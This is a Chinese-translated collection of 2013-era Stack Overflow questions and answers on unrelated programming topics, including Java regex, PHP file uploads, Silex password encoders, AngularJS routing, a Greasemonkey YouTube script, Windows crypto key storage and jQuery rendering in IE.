> 标签：java, regex

我正在尝试返回位于双引号中的字符串值，例如“Home Lone”。我正在编写一个测试脚本来匹配我的 UI 和数据库中的内容。这是示例代码

```
 public String getMonitorKeywords(String keywords1, String keywords2, String keywords3) {
    String words = "";
    if (keywords2 != null && keywords1 == null && keywords3 == null) {
        return words = keywords2.replaceAll("\\s+", " AND ");
        }

    else if(keywords2 == null && keywords1 == null && keywords3 != null){
        keywords2 = keywords3.replaceAll("\\s+", " OR ");
        words = keywords3;
        Util.println("From databse we have third keywords{}: " + words);
        return words;
    }

    else if(keywords2 != null && keywords1 != null && keywords3 == null){
        words = keywords1;
        Util.println("From databse we have first keywords{}: " + words);
        return words;
    }

    else if(keywords2 == null && keywords1 != null && keywords3 == null){
        words = keywords1;
        return words;
    }
    else {
        return null;
    }
} 
```

我的方法有问题，当关键字 2 有带双引号 {""} 的单词时，它会增加 AND 到其中，我不希望这些特定的单词集。谢谢我知道它与正则表达式有关，以过滤掉带引号的此类单词。并非所有单词都有引号。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T19:11:07.617

不明白...

```
"foo \"bar\" or something else".replaceAll("\\s+", " AND ") 
```

生产

> foo AND "bar" AND or AND something AND else

这不是你的本意吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T19:42:20.763

尝试：

```
("[^"]+?")|(\w+?)\b 
```

并替换为`"$1$2 AND"`.

这将在结果末尾留下一个额外的“AND”，因此您需要将其修剪掉。

# php - 将多维数组变成表格

> ID：14220225
> 
> 赞同：0
> 
> 时间：2013-01-08T17:02:04.563
> 
> 标签：php

我很难理解这个逻辑。（我已经完全重写了数据，因为它是一个工作的东西。但是，结构是一样的。）

我有一个如下所示的文本文件：

```
Ace
Hammer  12
Nails   4
Screwdriver  9

Home Depot
Nails 3
Screwdriver 11
Sawzall 43

Lowes
Hammer  10
Nails 5
Sawzall 42
Sledge  14 
```

所以有些商店有商品，也有商品有价格。我能够将其拉入如下所示的数组中：

```
array(3) {
  ["Ace"]=>
  array(3) {
    [0]=>
    array(2) {
      [0]=>
      string(5) "Hammer"
      [1]=>
      string(1) "12"
    }
    [1]=>
    array(2) {
      [0]=>
      string(5) "Nails"
      [1]=>
      string(1) "4"
    }
    [2]=>
    array(2) {
      [0]=>
      string(5) "Screwdriver"
      [1]=>
      string(1) "9"
    } 
```

我想将数据格式化为如下所示的 HTML 表：

```
 Ace     Home Depot      Lowes

Hammer          12          x               10
Nails           4           3               5
Screwdriver     9           11              x
Sawzall         x           43              42
Sledge          x           x               14 
```

由于每个商店都会有不同的项目，我想我必须创建一个项目数组并通过 array_unique 运行它。在那之后，它有点分崩离析。我一直在尝试各种级别的嵌套循环，但我无法使任何工作。对于编写此代码的任何帮助，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:25:16.857

你必须把它分解成更小的部分。就像 njk 在他的评论中提到的那样，您首先要处理表格标题，您可以手动编写。那么您所做的就是以下代码：

```
 <td>Hammer</td>
 <td>12</td>
 <td>x</td>
 <td>10</td> 
```

然后同样的事情，横跨水平轴。因此，您应该能够编写一个接受 2 个输入的函数，第一个是第一列的文本，然后是一个为下一列解析出来的数组，所以类似于

```
 function parseArray($item, $array)
 {
      print '<tr>';
      print '<td>' . $item . '</td>';
      foreach($array as $item)
      {
           print '<td>' . $item . '</td>';
      }
      print '</tr>';
 } 
```

然后，您可以在迭代初始循环时递归调用 parseArray。

# file - 如何使用 Photoshop CS5 打开 5 个文件 (.5)

> ID：14220226
> 
> 赞同：0
> 
> 时间：2013-01-08T17:02:09.170
> 
> 标签：file, photoshop, file-format, file-conversion

我最近在 Photoshop CS6 中制作了一个证书，出于某种奇怪的原因，该文件被保存为：

证书（文件类型：.5）

有没有办法可以将此文件转换为可在 Photoshop 中使用的格式？当我尝试使用 Photoshop 打开文件时，它显示：

“无法完成您的请求，因为它不是正确的文件类型。”

当我尝试 CS5 时也会发生同样的情况。我需要能够在 Photoshop 中再次编辑此文件。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T20:30:32.127

我的问题是我隐藏了文件扩展名。我正在使用 Windows 8 操作系统，因此我必须：

左键单击文件资源管理器>左键单击“查看”选项卡>选中“文件扩展名”框。

这样我就可以查看文件名末尾的扩展名。

这允许我删除 (.5) 到“certificate4.5”，添加 (.psd) “certificate4.psd”

它在 CS6 中完美打开并且是可编辑的。

在我更改文件名的结尾之前，我无法删除 (.5)，所以它会这样做：“certificate.5.psd”使其成为任何文件都无法识别的文件 (.5.psd ）。

# php - 如何将密码编码器附加到 Silex 中的用户界面？

> ID：14220229
> 
> 赞同：5
> 
> 时间：2013-01-08T17:02:16.640
> 
> 标签：php, symfony, silex

所以我正在尝试创建一个新的 Silex 应用程序并使用包含的安全包。为简单起见，我将使用基本的密码编码。

根据 Silex 文档[http://silex.sensiolabs.org/doc/providers/security.html](http://silex.sensiolabs.org/doc/providers/security.html)，我创建了一个自定义用户提供程序。但是，此用户界面似乎没有使用默认密码编码。

我可以成功获取密码

```
$password = $app['security.encoder.digest']->encodePassword('foo'); 
```

但是，当我使用示例时

```
// find the encoder for a UserInterface instance
$encoder = $app['security.encoder_factory']->getEncoder($user);

// compute the encoded password for foo
$password = $encoder->encodePassword('foo', $user->getSalt()); 
```

我明白了

> RuntimeException：没有为帐户配置编码器

在 symfony2 中，我会使用类似下面的东西

```
encoders:
        somename:
            class: Acme\DemoBundle\Entity\User
        Acme\DemoBundle\Entity\User: sha512
        Acme\DemoBundle\Entity\User: plaintext
        Acme\DemoBundle\Entity\User:
            algorithm: sha512
            encode_as_base64: true
            iterations: 5000
        Acme\DemoBundle\Entity\User:
            id: my.custom.encoder.service.id 
```

但这里似乎并非如此。我似乎找不到任何类型的 setEncoder 方法，所以我有点难过。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-09T08:28:05.470

您需要重新构建`EncoderFactory`以添加您的自定义实现：

```
<?php

$app = new Silex\Application();
$app['myapp.encoder.base64'] = new Base64PasswordEncoder();
$app['security.encoder_factory'] = $app->share(function ($app) {
    return new EncoderFactory(
        array(
            'Symfony\Component\Security\Core\User\UserInterface' => $app['security.encoder.digest'],
            'MyApp\Model\UserInterface'                          => $app['myapp.encoder.base64'],
        )
    );
}); 
```

*（哦，请不要使用 Base64Encoder() 作为密码 ;)）*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-06T21:42:33.493

我能够使用接受的答案来解决我的问题，但我无法`security.encoder_factory`直接分配它，所以我只是分享我发现的工作。

代替：

```
$app['security.encoder_factory'] = $app->share(function($app) {
    //..see above...//
}); 
```

我不得不使用：

```
$app->register(new Silex\Provider\SecurityServiceProvider(),array(
    'security.encoder_factory' => $app->share(function($app) {
    //... same as above ...//
    })
)); 
```

我对 Silex 太陌生了，不知道*为什么*它对我来说不能像上面那样工作。我最初的猜测是版本差异（两年前提出的问题）。我可以`security.provider.default`在调用注册模块之前分配给，但我似乎无法分配给`security.encoder_factory`. 我似乎也必须加入`security.firewalls`注册电话。

# c# - 会发生进程锁吗？

> ID：14220235
> 
> 赞同：1
> 
> 时间：2013-01-08T17:02:30.147
> 
> 标签：c#, multithreading

我正在尝试编写一个小程序，使不同计算机上的用户能够同时修改同一个文件（在所有用户都可以访问的目录中）并查看其他用户同时所做的更改。每次用户修改文件时，更改都会保存到文件 (.txt) 中，我使用 FileSystemWatcher 检测更改并使用更改更新其他用户。

我注意到如果我在程序运行并访问同一个文件时尝试使用记事本修改和保存文件，我会收到一条消息，说无法访问该文件，因为另一个进程正在访问它。我的问题是，如果在我的程序开发并在不同的计算机上运行之后，我会收到相同的错误消息吗？如果是的话，有没有办法解决这个问题？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:31:01.913

这是可能的，但您需要`System.IO.File.Open()`像这样使用完整版本，它允许其他进程打开同一个文件进行读写访问。

```
using System.IO;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            FileStream f = File.Open("c:\file.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
        }
    }
} 
```

# java - 将 XML 转换为 Java 对象

> ID：14220239
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:02:43.897
> 
> 标签：java, xml, converter, calculator

我只是想知道是否有人可以向我展示一种将 XML 文件转换为 Java 对象的快速方法：

```
- <VM-DataCalculator>
- <device name="Blackberry" fname="BlackBerry">
- <dataCategory>
  <name>email</name> 
  <datarate>0.002</datarate> 
  <max>300</max> 
  <percent>12</percent> 
  <timeunit>month</timeunit> 
  </dataCategory>
- <dataCategory>
  <name>emailAttachment</name> 
  <datarate>0.2</datarate> 
  <max>100</max> 
  <percent>10</percent> 
  <timeunit>month</timeunit> 
  </dataCategory> 
```

完整文件可在此处获得：http: [//www.virginmobile.ca/en/catalogue/VMDataCalculator.xml](http://www.virginmobile.ca/en/catalogue/VMDataCalculator.xml)

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:10:33.173

仅使用 Java 框架的标准解决方案是使用[JAXP](http://docs.oracle.com/javase/tutorial/jaxp/index.html)。还有[许多其他方法](https://stackoverflow.com/search?q=%5Bjava%5D%20%5Bxml%5D%20parse)。

JAXP 有点臃肿，要将一些 XML 解析为 DOM，您必须执行以下操作：

```
DocumentBuilderFactory dbfactory = DocumentBuilderFactory.newInstance();
dbfactory.setNamespaceAware(true);
DocumentBuilder domparser = dbfactory.newDocumentBuilder();
Document doc = domparser.parse("http://www.virginmobile.ca/en/catalogue/VMDataCalculator.xml"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:38:56.317

你需要 JAXB。这基本上是它的工作原理，你创建你的模型类

```
@XmlRootElement(name="VM-DataCalculator")
class VMDataCalculator {
    @XmlElement(name = "device")
    List<Device> devices;
}

@XmlRootElement
class Device {
    @XmlElement(name = "dataCategory")
    List<DataCategory> dataCategories;
}

@XmlRootElement
class DataCategory {
    @XmlElement
    String name;
          ....
} 
```

并解组你的 xml

```
 VMDataCalculator c = JAXB.unmarshal(new File("1.xml"), VMDataCalculator.class); 
```

更多细节在这里[http://docs.oracle.com/javase/tutorial/jaxb/intro/index.html](http://docs.oracle.com/javase/tutorial/jaxb/intro/index.html)

# c - 平面中 2 个点的边界框

> ID：14220240
> 
> 赞同：0
> 
> 时间：2013-01-08T17:02:45.233
> 
> 标签：c, algorithm, math, geometry, bounding-box

我在飞机上有 2 个点 A 和 B。我需要找到的是点 w、x、y 和 z，这样我就可以有一个统一的边界框。条件是由 wx 和 yz 形成的一条线平行于 AB。同样wBz 和xAy 是平行的一定是平行的。另请注意，角度 zwx 和 wxy 是直角。基本上 wxyz 必须是一个正方形。

```
 z
       /   /
     B      /
  /          /
w             /  
 /             y
  /          /
   /      A 
    /  /
     x 
```

如果线 AB 平行于 x 轴或 AB 平行于 y 轴，基本上找到 w、x、y 和 z 很容易。当线 AB 与 x 轴成角度时（线 AB 的斜率可以是正或负），我无法确定点 w、x、y 和 z。

任何意见/建议都将受到高度赞赏。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:20:59.667

将 A 和 B 视为平面中的向量 (xa, ya) 和 (xb, yb)。取向量差，生成从 A 指向 B 的向量 C。

```
C = A - B = (xa - xb, ya - yb) = (xc, yc) 
```

将这个向量在每个方向上旋转 90 度，然后缩放一半，得到 D = (xd, yd) 和 E = (xe, ye)。

```
D = (-yc/2, +xc/2)
E = -D = (+yc/2, -xc/2) 
```

使用向量算术得到正方形的四个点。

```
w = B + D
x = A + D
y = A + E
z = B + E 
```

**编辑**：胖手指。

**EDIT2**：忘记了一半的因素。

**EDIT3**：根据要求，矢量旋转参考。

为了计算出矢量旋转，通常可以使用[旋转矩阵](https://en.wikipedia.org/wiki/Rotation_matrix)进行乘法运算。在这种情况下，+/- pi/2 的 sin 和 cos 因子最终为 +/- 1。

如果矩阵乘法不是您的事，请在纸上（或想象一下）任何象限中的样本向量。现在将纸向任一方向旋转 90 度，看看 x 和 y 分量是如何交换和取反的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:48:02.347

neirbowjs 答案翻译成更优化的解决方案，如果优化让你的船浮起来。

你知道的变量`(Ax, Ay, Bx, By)`；

你解决的变量`(Wx, Wy, Xx, Xy, Yx, Yy,Zx, Zy)`；

```
float dx = By - Ay / 2;
float dy = Bx - Ax / 2;

float Wx = Ax - dx; 
float Wy = Ay + dy; 
float Zx = Ax + dx; 
float Zy = Ay - dy; 
float Xx = Bx - dx; 
float Xy = By + dy; 
float Yx = Bx + dx; 
float Yy = By - dy; 
```

# routes - 如何根据当前路由名称/控制器设置类

> ID：14220244
> 
> 赞同：28
> 
> 时间：2013-01-08T17:02:50.600
> 
> 标签：routes, angularjs

尝试根据我当前的控制器或当前路由（URL 段 1）设置一个类。

就像是

```
<body class="{{controllerName}}"> 
```

这样，如果我需要针对 CSS 特定性定位单独的页面，它就很容易了。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-01-08T17:48:23.770

我的解决方案是：在路由范围内订阅路由更改并将控制器的名称放在那里：

```
app.run(function($rootScope) {
   $rootScope.$on('$routeChangeSuccess', function(ev,data) {   
     if (data.$route && data.$route.controller)
       $rootScope.controller = data.$route.controller;
   })
}); 
```

检查[Plunker 解决方案](http://plnkr.co/edit/fR6gSqeXbROl410tgzPJ?p=preview)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-08T17:13:58.667

您可以使用[$route](http://docs.angularjs.org/api/ng.%24route)服务，它具有`current`可以为您提供当前控制器的属性。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-05-23T17:53:25.720

甚至更简单。参数上直接有一个`controller`属性`data`。

```
$rootScope.$on("$routeChangeSuccess", function(e, data) {
    $rootScope.controller = data.controller;
}); 
```

据我所知，该`data`论点与`$route.current`. 该`controller`属性位于该对象的原型中。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-05-05T15:22:07.133

对于 Angular 1.3 版本，您可以使用以下代码：

```
$rootScope.$on('$routeChangeSuccess', function (ev, data) {
    if (data.$$route && data.$$route.controller)
        $rootScope.controller = data.$$route.controller;
}); 
```

# php - PHP - 创建和上传到目录

> ID：14220247
> 
> 赞同：0
> 
> 时间：2013-01-08T17:02:58.173
> 
> 标签：php, mysql, session, mkdir, subdirectory

我正在尝试将文件上传到使用 PHP 创建的目录。应用程序应根据用户的 UserID 在根目录内创建一个子目录。（例如文件/14/）。

正在创建目录，但文件没有上传到子目录。

这是代码：

```
<?php 

                include("dbConfig.php");

                $Username = $_SESSION["username"];

                global $userid;

                $Password = $_SESSION["password"];

                $Password = md5($Password);

                $sql = "SELECT UserID FROM users WHERE Username = '".$Username."'";

                $result = mysql_query($sql) or die(mysql_error());

                while($row = mysql_fetch_assoc($result)) {

                        $userid = $row['UserID'];

                }

                echo $userid;

                $dirname = (string)$userid;

                $filename = ("/folder/" . "$dirname" . "/");

                if (!file_exists($filename))

                {

                            mkdir("files/$dirname", 0777);

                            if (isset($_FILES['files'])) {

                            echo "<div id='files_table'><table class='center'.><tr><td>";

                            $dest = ("files/" . $dirname . "{$_FILES['files']['name'][$key]}");

                            foreach($_FILES['files']['tmp_name'] as $key => $tmp_name){

                            move_uploaded_file($tmp_name, $dest );

                            echo $_FILES['files']['name'][$key], " uploaded.", "<br>";

                            }

                 }else {

                        if (isset($_FILES['files'])) {

                        echo "<div id='files_table'><table class='center'.><tr><td>";

                            $dest = ("files/" . $dirname . "{$_FILES['files']['name'][$key]}");

                            foreach($_FILES['files']['tmp_name'] as $key => $tmp_name){

                            move_uploaded_file($tmp_name, $dest );

                            echo $_FILES['files']['name'][$key], " uploaded.", "<br>";

                    }
                    echo "</td></tr></table></div><br><br>";
                    }

                 }

            } 
```

![目录结构](../Images/28b409ccad5fd4c53c31f73249d03154.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:18:49.833

大脑，PHP支持一次上传一个文件，如果表单中有多个文件字段，则应保留 "$dest = ("files/" . $dirname . "{$_FILES['files']['name' ][$key]}");" 在循环。$Key 在循环外将为空。

循环不能在 temp_name 上，temp_name 是 php 将要上传的文件的临时副本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:27:42.787

这是修改后的代码：

注意：我也更正了您代码中的一些错误。请比较。

```
<?php 
include("dbConfig.php");
$Username = $_SESSION["username"];
global $userid;
$Password = $_SESSION["password"];
$Password = md5($Password);

$sql = "SELECT UserID FROM users WHERE Username = '".$Username."'";

$result = mysql_query($sql) or die(mysql_error());
while($row = mysql_fetch_assoc($result)) {
   $userid = $row['UserID'];
}

$dirname = (string)$userid;
$filename = ("$dirname" . "/");
if (!file_exists($filename)) {
    mkdir("files/$dirname", 0775);
}

if (isset($_FILES['files'])) {
    echo "<div id='files_table'><table class='center'.><tr><td>";        
    foreach($_FILES['files']['tmp_name'] as $key => $tmp_name){
        $dest = ("files/" . $dirname . "{$_FILES['files']['name'][$key]}");
        move_uploaded_file($tmp_name, $dest );
        echo $_FILES['files']['name'][$key], " uploaded.", "<br>";
    }

} 
```

?>

# javascript - 如何从 Greasemonkey 调用这个 YouTube 功能？

> ID：14220250
> 
> 赞同：1
> 
> 时间：2013-01-08T17:03:04.093
> 
> 标签：javascript, youtube, youtube-api, greasemonkey

我正在尝试使用 Greasemonkey 观看视频的时间来显示警报。

[我的脚本](http://userscripts.org/scripts/review/156005)：

```
// ==UserScript==
// @name        Time YouTube
// @description Does not work ! Help !
// @namespace   time_youtube
// @include     *youtube.com/watch*
// @grant       GM_setValue
// @icon        http://aux3.iconpedia.net/uploads/520882026785186105.png
// @version     1.3
// ==/UserScript==

ytplayer        = document.getElementById ("movie_player");
var time        = document.createElement ('a');
time.innerHTML  = '<a style="position: fixed; top: 200px; left: 3px; color:black;">Time</a>';

//time.addEventListener ('click', function(){GM_setValue('url_time',(document.location.href) + '&t=' + (ytplayer.getCurrentTime()));}, false);
time.addEventListener ('click',
    function () {
        alert (ytplayer.getCurrentTime() );
    },
    false
);

document.body.appendChild (time); 
```

但这不起作用。

你能帮助我吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T23:38:22.657

由于各种安全和范围问题，您不能`ytplayer.getCurrentTime()`从 Greasemonkey 脚本范围运行。

同样，`click`事件处理程序必须在目标页面的范围内运行才能访问该函数。尝试不这样做会产生`undefined`和的组合`Error: Bad NPObject as private data!`。

这意味着您必须`click`为您的时间按钮“注入”处理程序。
但首先，这里还有几个问题需要考虑：

1.  Youtube 和大多数 Google 网站都广泛使用`<iframe>`s。为避免多次执行脚本时出现问题，请使用检查`window.top === window.self`以确保脚本仅在框架中运行或包含您所定位的页面。
2.  `innerHTML`尽可能避免使用和内联样式。这将使代码更易于维护，在许多情况下更快，并且不太可能触发意外的副作用。

综上所述，这是重构的**完整脚本：**

```
// ==UserScript==
// @name        Time YouTube
// @description Does not work ! Help !
// @namespace   time_youtube
// @include     *youtube.com/watch*
// @icon        http://aux3.iconpedia.net/uploads/520882026785186105.png
// @grant       GM_setValue
// @grant       GM_addStyle
// @version     1.3
// ==/UserScript==

//-- Only run in the top page, not the various iframes.
if (window.top === window.self) {
    var timeBtn         = document.createElement ('a');
    timeBtn.id          = "gmTimeBtn";
    timeBtn.textContent = "Time";
    //-- Button is styled using CSS, in GM_addStyle, below.

    document.body.appendChild (timeBtn);

    addJS_Node (null, null, activateTimeButton);
}

function activateTimeButton () {
    var timeBtn = document.getElementById ("gmTimeBtn");
    if (timeBtn) {
        timeBtn.addEventListener ('click',
            function () {
                var ytplayer = document.getElementById ("movie_player");
                //-- IMPORTANT:  GM_functions will not work here.

                console.log ("getCurrentTime(): ", ytplayer.getCurrentTime() );
                //alert (ytplayer.getCurrentTime() );
            },
            false
        );
    }
    else {
        alert ("Time button not found!");
    }
}

//-- Style and position our button the CSS way.
GM_addStyle ( "                 \
    #gmTimeBtn {                \
        position:   fixed;      \
        top:        200px;      \
        left:       3px;        \
        color:      black;      \
        margin:     0;          \
        padding:    0;          \
    }                           \
" );

//-- This is a standard-ish utility function...
function addJS_Node (text, s_URL, funcToRun, runOnLoad) {
    var D                                   = document;
    var scriptNode                          = D.createElement ('script');
    if (runOnLoad) {
        scriptNode.addEventListener ("load", runOnLoad, false);
    }
    scriptNode.type                         = "text/javascript";
    if (text)       scriptNode.textContent  = text;
    if (s_URL)      scriptNode.src          = s_URL;
    if (funcToRun)  scriptNode.textContent  = '(' + funcToRun.toString() + ')()';

    var targ = D.getElementsByTagName ('head')[0] || D.body || D.documentElement;
    targ.appendChild (scriptNode);
} 
```

* * *

最后，从您的脚本来看，您希望`GM_setValue()`在单击该按钮时最终使用等。这需要跨范围的消息传递。 当您到达该部分时，**请参阅[此答案或打开一个新问题。](https://stackoverflow.com/a/11379215/331508)**

# ios - 是否可以使用 NSAttributedString 设置多个字体属性

> ID：14220256
> 
> 赞同：9
> 
> 时间：2013-01-08T17:03:27.340
> 
> 标签：ios, string, nsattributedstring

我正在尝试减小部分字符串的大小并使用以下代码。我的输出不正确。我只看到我的第一个字体属性用于整个字符串，而不是指定的范围。

```
 NSMutableAttributedString *attString=[[NSMutableAttributedString alloc] initWithString:title];
    NSInteger _stringLength=[descriptionText length];
    [attString addAttribute:NSFontAttributeName
                      value:[UIFont fontWithName:@"Gotham-Bold" size:20.0]
                      range:NSMakeRange(0, 10)];
    [attString addAttribute:NSFontAttributeName
                      value:[UIFont fontWithName:@"Helvetica-Bold" size:12.0]
                      range:NSMakeRange(11, _stringLength-1)];
    [self.description setAttributedText:attString]; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-10-13T09:41:08.593

我也遇到过这个问题。对于第二个字体选择，您需要将字符串长度的减号设置为与其开始的位置相同。

```
 [attString addAttribute:NSFontAttributeName
                    value:[UIFont fontWithName:@"Helvetica-Bold" size:12.0]
                    range:NSMakeRange(11, _stringLength-11)]; 
```

而不是：

```
 [attString addAttribute:NSFontAttributeName
                    value:[UIFont fontWithName:@"Helvetica-Bold" size:12.0]
                    range:NSMakeRange(11, _stringLength-1)]; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-03-06T15:34:32.723

我的 2 美分 ;) Swift 3

```
func attributedTexts(text1: String, attribs1: [String : Any]?, text2: String, attribs2: [String : Any]?) {

    let str = NSMutableAttributedString(string: text1, attributes: attribs1);
    str.append(NSAttributedString(string: text2, attributes: attribs2))

    return str
} 
```

**用法：**

```
let attr1 = [NSFontAttributeName: UIFont.boldSystemFont(ofSize: 24)]
let attr2 = [NSFontAttributeName: UIFont.systemFont(ofSize: 16)]
let attributedString = self.attributedTexts(text1: "First Text", attribs1: attr1, text2: "\nSecond Text", attribs2: attr2) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T17:09:33.040

请看看这个网站和视频，你可能会得到一些有用的东西

[富文本](http://www.cocoanetics.com/2011/01/rich-text-editing-on-ios/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T06:38:55.723

您的代码没有任何问题。可能您正在尝试使用不存在的字体名称。您是否检查过字体是否确实存在，例如通过 po 或 NSLog？

如果您记录属性字符串，输出是什么？

# ruby - Fedora 17 中 gem install gsl 的问题

> ID：14220261
> 
> 赞同：1
> 
> 时间：2013-01-08T17:03:37.540
> 
> 标签：ruby, gem, fedora, gsl

我有 Fedora 17 并安装了以下内容：

```
 ruby-1.9.3.327-19.fc17.x86_64 
    rubygems-1.8.24-1.fc17.noarch 
    gsl-1.15-4.fc17.x86_64 
    gsl-devel-1.15-4.fc17.x86_64 
```

我跑

```
$ gem install gsl 
```

试图获得 ruby​​/gsl。

我得到结果

```
ERROR: Error installing gsl: 
       ERROR: Failed to build gem native extension. 
```

加上大长输出。关于我可能缺少什么的任何建议？

关于如何让 gem install gsl 工作的任何建议？

# c# - Windows 加密容器的安全性如何？

> ID：14220264
> 
> 赞同：8
> 
> 时间：2013-01-08T17:03:46.247
> 
> 标签：c#, windows, security, rsa

我正在使用每用户 Win32 加密密钥容器（通过 .Net`RSACryptoServiceProvider`类）来存储用于在密码管理器中解密存储密码的私钥。

该私钥存储的安全性如何？显然，任何从同一用户帐户运行的程序都可以访问它。但是密钥实际上是根据用户的密码加密的吗？

**我可以假设只有**在用户登录后才能访问私钥吗？或者服务（或另一个帐户）仍然可以提取密钥吗？不知道用户密码的电脑管理员可以解压吗？可以通过使用管理帐户重置用户密码来提取密钥吗？如果计算机被盗，攻击者可以访问硬盘（但不知道用户密码），他能提取私钥吗？如果用户已锁定会话，攻击者能否使用管理帐户/内核驱动程序从内存中提取密钥？

PS我知道“万能钥匙”模式，但在我的情况下这是不可接受的，所以我需要以最安全的方式存储密码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T19:07:35.240

用户的私钥应该只有在用户登录后才能访问，并且不能简单地通过重置用户密码然后使用重置密码登录来访问（实际上，在重置用户密码之前，有警告说用户将丢失访问加密数据等）请参阅：http: [//support.microsoft.com/kb/290260](http://support.microsoft.com/kb/290260)

但是，一旦用户登录，同一台机器上的其他用户进程就有可能具有足够的权限（通常只授予管理/系统帐户）来访问存储的密钥，例如通过将代码注入到用户进程中将运行我是用户的上下文，因此能够执行用户可以使用密钥执行的任何操作（使用它来解密、签名或导出密钥等）。

启用强私钥保护可以通过要求用户在使用密钥时输入密码来缓解其中一些问题。即使这样，恶意代码仍有可能截获密钥的密码。

# jquery - jQuery动画方法没有停止

> ID：14220266
> 
> 赞同：2
> 
> 时间：2013-01-08T17:03:51.890
> 
> 标签：jquery, jquery-ui

这是我的动画幻灯片的简单代码。它应该做两件事：-首先在“mouseenter”事件中-它反弹“拇指”图像-第二-显示并反弹缩略图的较大图像

```
$('img.thumb').mouseover(function (){
    $(this).effect('bounce', 500, function(){
        var src = 'images/screens/' + $(this).attr('id').substr(0,1) + '.jpg';
        $('.slideShow img').attr('src' ,src);
        $('.slideShow img').toggle('bounce').css('margin-top','2.5%');
        });
    });
$('img.thumb').mouseleave(function (){
        $('.slideShow img').fadeOut();
    }); 
```

问题是它在谷歌浏览器中运行得非常完美，但在 Firefox 和 IE 中它表现得很疯狂：拇指图像不断弹跳，更大的图像不断出现和消失。

这里的诀窍是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-30T02:09:56.237

根据我从您的帖子中了解到的情况，我认为 Jquery 工具提示小部件是您正在寻找的自定义动画：http: [//jqueryui.com/tooltip/#custom-animation](http://jqueryui.com/tooltip/#custom-animation)

这符合您的要求吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-30T02:14:22.680

```
$('img.thumb').mouseover(function (){
    $(this).effect('bounce', 500, function(){
        var src = 'images/screens/' + $(this).attr('id').substr(0,1) + '.jpg';
        $('.slideShow img').attr('src' ,src);
        $('.slideShow img').css('margin-top','2.5%');
        });
    });
$('img.thumb').mouseleave(function (){
        $('.slideShow img').fadeOut();
    }); 
```

# jquery - 带有图像的 jQuery 动态内容在 IE8/9 中无法正确加载/呈现

> ID：14220268
> 
> 赞同：0
> 
> 时间：2013-01-08T17:03:59.133
> 
> 标签：jquery

我创建了一个带有在线商店的网站。有不同类别的产品。我正在使用 jQuery 选项卡显示这些类别。每个类别选项卡都列出了该类别下的产品。我正在使用 jQuery 动态创建类别选项卡和内容。我还使用 jQuery NailThumb 即时生成缩略图。网址是：

[http://www.thekclonghorns.com/TeamStore/Store.aspx](http://www.thekclonghorns.com/TeamStore/Store.aspx)

该页面在除 IE8 和 IE9 之外的所有浏览器上都能正常呈现。在我循环浏览所有选项卡后，它在 IE8 和 IE9 中显示良好。

显示商店的代码如下。任何想法为什么这不能在 IE 中正确呈现？

谢谢！

```
$(document).ready(function () {

    setupPage();

});

function setupPage() {
    showProgress();
    clearProducts();

    setupCategories();
}

function setupCategories() {
    loadingCount++;

    GetCategories([], true,
    {
        successCallback: function (data) {
            if ((data) && (data != null) && (data.length > 0)) {
                setupProducts(data);
            }

            data = null;
        },
        errorCallback: function (httpRequest, status, error, functionName) {
            httpRequest = null;
            status = null;
            error = null;
            functionName = null;
        },
        completeCallback: function () {
            loadingCount--;
            checkLoading();
        }
    });
}

function setupProducts(categories) {
    GetProducts([], true,
    {
        successCallback: function (data) {
            if ((data) && (data != null) && (data.length > 0)) {
                buildCategoryDisplay(categories, data);
            }

            data = null;
        },
        errorCallback: function (httpRequest, status, error, functionName) {
            httpRequest = null;
            status = null;
            error = null;
            functionName = null;
        },
        completeCallback: function () {
            loadingCount--;
            checkLoading();
        }
    });
}

function buildCategoryDisplay(categories, products) {
    var content = [];
    var category;
    var product;
    var totalCols = 4;
    var limit = 0;

    content.push("<div id=\"tabs\">");
    content.push("<ul>");

    for (var i = 0; i < categories.length; i++) {
        category = categories[i];
        if (category.IsActive) {
            content.push("<li><a href=\"#tabs-" + category.Id + "\">" + category.Name + "</a></li>");
        }
    }
    content.push("</ul>");

    for (var i = 0; i < categories.length; i++) {
        category = categories[i];
        if (category.IsActive) {
            content.push("<div id=\"tabs-" + category.Id + "\">");
            content.push("<h4>" + category.Name + "</h4>");
            //get the list of products for this category and display them with links to details page
            if (products != null && products.length > 0) {
                content.push("<table cellspacing=\"0\" cellpadding=\"0\" rules=\"none\" border=\"0\" class=\"modal_page_form\" style=\"width: 540px; margin: 4px;border-collapse: collapse; margin-bottom: 0px;\">");
                content.push("<tr>");
                for (var j = 0; j < products.length; j++) {                    
                    product = products[j];
                    if (product.Category.Name == category.Name) {
                        limit = limit + 1;
                        content.push("<td><a href=" + pageLocation + "TeamStore/StoreProductDetails.aspx?ProductId=" + product.Id + ">");
